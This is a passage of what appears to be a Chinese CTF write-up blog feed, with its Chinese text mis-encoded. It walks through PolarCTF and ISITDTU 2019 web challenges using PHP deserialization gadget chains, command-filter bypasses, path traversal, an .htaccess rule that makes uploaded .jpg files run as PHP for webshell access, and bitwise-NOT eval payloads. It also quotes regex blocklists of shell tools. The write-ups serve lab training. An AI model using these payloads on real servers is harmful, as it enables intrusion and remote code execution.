ä¹æ‰€æœ‰å¸¸è§è¯»æ–‡ä»¶&#x2F;æ‰§è¡Œå‘½ä»¤çš„å·¥å…·ï¼šcatã€lsã€grepã€moreã€lessã€headã€tailã€tacã€viã€nlã€odã€sedã€pasteã€diffã€fileã€wgetã€echoã€bashã€shç­‰ã€‚</li><li>ç¦æ­¢å¸¸è§æ³¨å…¥åˆ†éš”ç¬¦ï¼š;ã€&amp;ã€ã€&amp;&amp;ã€||ã€æ¢è¡Œã€ç©ºæ ¼ç±»ä¼¼ï¼ˆ\xA0æ˜¯éæ–­ç©ºæ ¼ï¼‰ã€åå¼•å·ã€å•åŒå¼•å·ã€åæ–œæ ã€*?{}$<a href=""></a>&lt;&gt;ç­‰é€šé…ç¬¦å’Œé‡å®šå‘ã€‚</li><li>ç”šè‡³ç¦æ­¢flagå…³é”®å­—æœ¬èº«ï¼Œé˜²æ­¢ç›´æ¥cat flagã€‚</li></ul></li></ul><p>urlä¸­<code>_</code>çš„ç»•è¿‡å¯ä»¥ä½¿ç”¨phpç‰¹æ€§ï¼Œå¯¹å…³é”®è¯çš„è¿‡æ»¤å¯ä»¥ä½¿ç”¨<code>\</code>ç»•è¿‡</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">?c[md=ta<span class="hljs-string">\c</span> /fl<span class="hljs-string">\ag.php</span><br></code></pre></td></tr></table></figure><h2 id="bllbl-ser1"><a href="#bllbl-ser1" class="headerlink" title="bllbl_ser1"></a>bllbl_ser1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bllbl</span></span><br><span class="hljs-class">   </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$qiang</span>;<span class="hljs-comment">//æˆ‘çš„å¼º</span><br>   <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>   <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">bllliang</span>();<br>   &#125;<br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bllliang</span>(<span class="hljs-params"></span>)</span>&#123;<br>   <span class="hljs-variable language_">$this</span>-&gt;qiang-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>   &#125;<br>   &#125;<br><br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bllnbnl</span></span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$er</span>;<span class="hljs-comment">//æˆ‘çš„å„¿</span><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>)</span>&#123;<br>   <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;er);<br>   &#125;<br>   &#125;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;blljl&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$user_data</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;blljl&#x27;</span>]);<br>   &#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦è§¦å‘<code>close</code>ï¼Œéœ€è¦å…ˆè§¦å‘<code>bllliang</code>ï¼Œè¦è§¦å‘<code>bllliang</code>éœ€è¦å…ˆè§¦å‘é”€æ¯å‡½æ•°<code>__destruct()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bllbl</span></span><br><span class="hljs-class">    </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qiang</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">bllliang</span>();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bllliang</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;qiang-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bllnbnl</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$er</span> = <span class="hljs-string">&#x27;system(&quot;ls /&quot;);&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;er);<br>    &#125;<br>    &#125;<br>   <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">bllbl</span>();<br>   <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">bllnbnl</span>();<br>   <span class="hljs-variable">$a</span>-&gt;qiang = <span class="hljs-variable">$b</span>;<br>   <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1ncIud3"><a href="#1ncIud3" class="headerlink" title="1ncIud3"></a>1ncIud3</h2><p>æ ¹æ®é¢˜ç›®æç¤ºå¸¸è§çš„æ›¿æ¢æœ‰</p><p>f1a9 f1ag f149</p><p>åˆå› ä¸ºæ˜¯åœ¨æŸä¸ªç›®å½•ä¸‹ï¼Œæ‰€ä»¥ç”¨â€¦&#x2F;.&#x2F;ä¸ºä¸€ç»„ï¼Œä¸å‡ºæ„å¤–åŸºæœ¬é¢˜å‹æœ€å¤šä¹Ÿå°±å››ç»„ï¼Œå››ç»„è¿˜ä¸è¡Œçš„è¯å°±æ¢å‘½ä»¤äº†</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?page=...<span class="hljs-regexp">/./</span>...<span class="hljs-regexp">/./</span>f1a9<br></code></pre></td></tr></table></figure><h2 id="ç‹—é»‘å­çš„RCE"><a href="#ç‹—é»‘å­çš„RCE" class="headerlink" title="ç‹—é»‘å­çš„RCE"></a>ç‹—é»‘å­çš„RCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><br><br>    <span class="hljs-variable">$gouheizi1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gouheizi1&#x27;</span>];<br>    <span class="hljs-variable">$gouheizi2</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gouheizi2&#x27;</span>];<br>    <span class="hljs-variable">$gouheizi2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;gouheizi&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$gouheizi2</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|dir|flag|type|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$gouheizi1</span>)) &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;badly!&quot;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$gouheizi2</span>===<span class="hljs-string">&quot;gouheizi&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$gouheizi1</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;gouheizi!&quot;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒé€»è¾‘æ€»ç»“</p><p>è¦æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œå¿…é¡»åŒæ—¶æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ol><li>POST ä¼ å…¥çš„ gouheizi2 ç»è¿‡ str_replace(â€˜gouheiziâ€™,â€™â€™,â€¦) åï¼Œ**ç»“æœä»ç„¶ä¸¥æ ¼ç­‰äº â€œgouheiziâ€**ã€‚</li><li>GET ä¼ å…¥çš„ gouheizi1 æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„å‘½ä»¤ï¼Œä¸”<strong>ä¸èƒ½åŒ…å«æ­£åˆ™ä¸­åˆ—å‡ºçš„ä»»ä½•è¢«ç¦å­—ç¬¦&#x2F;å‘½ä»¤</strong>ã€‚</li></ol><p>gouheizi2åˆ©ç”¨åŒå†™ç»•è¿‡ï¼Œgouheizi1æ²¡æœ‰è¿‡æ»¤ <code>\</code>  <code>/</code>ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">gouheizi1</span>=l\s /<br><span class="hljs-attribute">gouheizi2</span>=gougouheiziheizi<br></code></pre></td></tr></table></figure><h2 id="ç®€å•çš„é“¾å­"><a href="#ç®€å•çš„é“¾å­" class="headerlink" title="ç®€å•çš„é“¾å­"></a>ç®€å•çš„é“¾å­</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd)) &#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-comment">// function __destruct() &#123;</span><br>    <span class="hljs-comment">//     if (isset($this-&gt;cmd)) &#123;</span><br>    <span class="hljs-comment">//         system($this-&gt;cmd);</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();        <br><span class="hljs-variable">$a</span>-&gt;cmd = <span class="hljs-string">&quot;cat /flag&quot;</span>; <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);   <br></code></pre></td></tr></table></figure><h2 id="rceå‘½ä»¤æ‰§è¡Œç³»ç»Ÿ"><a href="#rceå‘½ä»¤æ‰§è¡Œç³»ç»Ÿ" class="headerlink" title="rceå‘½ä»¤æ‰§è¡Œç³»ç»Ÿ"></a>rceå‘½ä»¤æ‰§è¡Œç³»ç»Ÿ</h2><p>ç›®å½•æ‰«æå‡ºflag.txt</p><p>è®¿é—®å¾—åˆ°æç¤ºï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">txt</span> &gt; php<br><span class="hljs-attribute">l</span> &gt; <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºè®¿é—®<code>./f1ag.php</code></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">hint:</span>æ—¢ç„¶ä½ æ‰¾åˆ°è¿™é‡Œäº†é‚£å°±å‘Šè¯‰ä½ ç‚¹ä¸œè¥¿å§ å¼‚æˆ–åå®ƒå¥½åƒæ”¹åå«XOR_KEYï¼Œç»™ä»–ä¼ ä¸ªå‚è¯•ä¸€è¯•å‘¢ï¼Œå¯¹äº†ï¼Œå’±ä»¬çš„é¶åœºå«ä»€ä¹ˆæ¥ç€ï¼ŸğŸ¤”<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">env <span class="hljs-attribute">XOR_KEY</span>=Polar<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>è®°å½•ä¸€ç§æ–‡ä»¶ä¸Šä¼ çš„ç»•è¿‡æ–¹æ³•</title>
    <link href="/2025/12/11/%E8%AE%B0%E5%BD%95%E4%B8%80%E7%A7%8D%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
    <url>/2025/12/11/%E8%AE%B0%E5%BD%95%E4%B8%80%E7%A7%8D%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="è®°å½•ä¸€ç§æ–‡ä»¶ä¸Šä¼ çš„ç»•è¿‡æ–¹æ³•"><a href="#è®°å½•ä¸€ç§æ–‡ä»¶ä¸Šä¼ çš„ç»•è¿‡æ–¹æ³•" class="headerlink" title="è®°å½•ä¸€ç§æ–‡ä»¶ä¸Šä¼ çš„ç»•è¿‡æ–¹æ³•"></a>è®°å½•ä¸€ç§æ–‡ä»¶ä¸Šä¼ çš„ç»•è¿‡æ–¹æ³•</h1><p>åˆ·polarctfé‡åˆ°çš„ä¸€é“é¢˜ç›®ã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251211191037726-1765451472860-1.png" alt="image-20251211191037726"></p><p>è€ƒè™‘ä½¿ç”¨ <code>.htaccess</code> è§¦å‘è§£ææ‰§è¡Œã€‚ä½†æ˜¯ä¼ å…¥çš„jpgæ–‡ä»¶ä¸èƒ½æœ‰<code>&lt;?</code>ï¼Œä½¿ç”¨<code>&lt;script language=&quot;php&quot;&gt;phpä»£ç &lt;/script&gt;</code>ä¸Šä¼ æˆåŠŸåä¹Ÿä¸èƒ½èšå‰‘è¿æ¥ã€‚åŸå› åº”è¯¥æ˜¯php7ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œä¸èƒ½è¿™ä¹ˆä½¿ç”¨phpæ ‡ç­¾å¤´ã€‚</p><p>ä½¿ç”¨çš„æ–¹æ³•æ˜¯ä¿®æ”¹<code>.htaccess</code>é…ç½®æ–‡ä»¶ï¼Œä»¥ç”¨åé—¨è¯»å–base64</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.htaccess</span>æ–‡ä»¶ï¼š<br>AddType application/x-httpd-php <span class="hljs-string">.jpg</span><br>php_value auto_append_fi\<br>le <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=shell.jpg&quot;</span><br></code></pre></td></tr></table></figure><p>ä¹‹åå†ä¸Šä¼ å›¾ç‰‡ç å°±å¯ä»¥æ­£å¸¸è¿æ¥ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>[ISITDTU 2019]EasyPHP</title>
    <link href="/2025/11/10/ISITDTU-2019-EasyPHP/"/>
    <url>/2025/11/10/ISITDTU-2019-EasyPHP/</url>
    
    <content type="html"><![CDATA[<h1 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h1><p>å¹¶éeasyã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$_</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="hljs-variable">$_</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;rosÃ© will not do it&#x27;</span>);<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_</span>), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you are so close, omg&#x27;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>åªè¦ç»•è¿‡ä¸¤ä¸ªifå°±å¯ä»¥å®ç°rceã€‚</p><p>å…ˆçœ‹ç¬¬ä¸€ä¸ªæ­£åˆ™åŒ¹é…ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="hljs-variable">$_</span>)<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ­£åˆ™åŒ¹é…çš„å­—ç¬¦åŒ…æ‹¬ï¼š</p><ul><li><strong>æ§åˆ¶å­—ç¬¦</strong>ï¼šASCII 0ï½31ï¼ˆåŒ…æ‹¬ <code>\t</code>, <code>\n</code>, <code>\r</code> ç­‰ï¼‰ï¼›</li><li><strong>ç©ºæ ¼</strong>ï¼›</li><li><strong>æ•°å­—</strong>ï¼š<code>0â€“9</code>ï¼›</li><li><strong>æ ‡ç‚¹ç¬¦å·</strong>ï¼š<code>&#39; &quot; </code> $ &amp; . , | [ { _&#96;ï¼›</li><li><strong>å­—æ¯</strong>ï¼š<code>d, e, f, g, o, p, s</code>ï¼ˆåŠå…¶å¤§å†™ï¼‰ï¼›</li><li><strong>ASCII 127ï¼ˆDELï¼‰</strong>ã€‚</li></ul><p>å†çœ‹ç¬¬äºŒä¸ªifï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_</span>), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251110154812637.png" alt="image-20251110154812637"></p><p>æŸ¥è¯¢phpæ‰‹å†Œå¯ä»¥çœ‹åˆ°<code>count_chars()</code><strong>mode</strong>ä¸º3æ—¶ç›¸å½“äºç»Ÿè®¡å­—ç¬¦ç§ç±»æ•°ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ„é€ çš„payloadé‡Œé¢å­—ç¬¦ç§ç±»ä¸èƒ½è¶…è¿‡13ä¸­ã€‚</p><p>çœ‹äº†ä¸€ä¸ªå¸ˆå‚…çš„åšå®¢å‘ç°ä½¿ç”¨è¿™ä¸ªè„šæœ¬å¯ä»¥å¾—åˆ°ä¸è¢«ç¦æ­¢çš„å‡½æ•°åï¼Œä½†æ˜¯è¿‡æ»¤ç»“æœæ²¡æœ‰å¯ç”¨å‡½æ•°ã€‚</p><p>[<a href="https://kinseyy.github.io/2024/07/25/ISITDTU-2019-EasyPHP/">ISITDTU 2019]EasyPHP | åŒ—æ­Œ</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$array</span>=<span class="hljs-title function_ invoke__">get_defined_functions</span>();<span class="hljs-comment">//è¿”å›æ‰€æœ‰å†…ç½®å®šä¹‰å‡½æ•°</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$array</span>[<span class="hljs-string">&#x27;internal&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$arr</span>)&#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9\&#x27;&quot;\`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="hljs-variable">$arr</span>) ) <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$arr</span>), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> ) <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">print</span>(<span class="hljs-variable">$arr</span>.<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">//è¿è¡Œç»“æœ</span><br>bcmul<br>rtrim<br>trim<br>ltrim<br>chr<br>link<br>unlink<br>tan<br>atan<br>atanh<br>tanh<br>intval<br>mail<br>min<br>max<br>virtual<br></code></pre></td></tr></table></figure><p>å†çœ‹ç¬¬ä¸€ä¸ªifå‘ç°æ²¡æœ‰è¿‡æ»¤æ‰~å’Œ^ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ç”¨æŒ‰ä½å–åã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;phpinfo&quot;</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//%8F%97%8F%96%91%99%90</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸåæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹æŸ¥çœ‹disable_functionsçœ‹ä¸€ä¸‹å¯ç”¨å‡½æ•°ã€‚</p><p>å‘ç°æ‰€æœ‰çš„å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°éƒ½è¢«ç¦äº†ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°flagæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨scandir()æˆ–è€…glob()åˆ—ç›®å½•ï¼Œä½†å®ƒè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªprint_ræˆ–var_dump</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>));<br></code></pre></td></tr></table></figure><p>ç›´æ¥æš´åŠ›å¼‚æˆ–ï¼Œä½†æ˜¯å‘ç°å­—ç¬¦ç§ç±»æ•°è¶…äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span 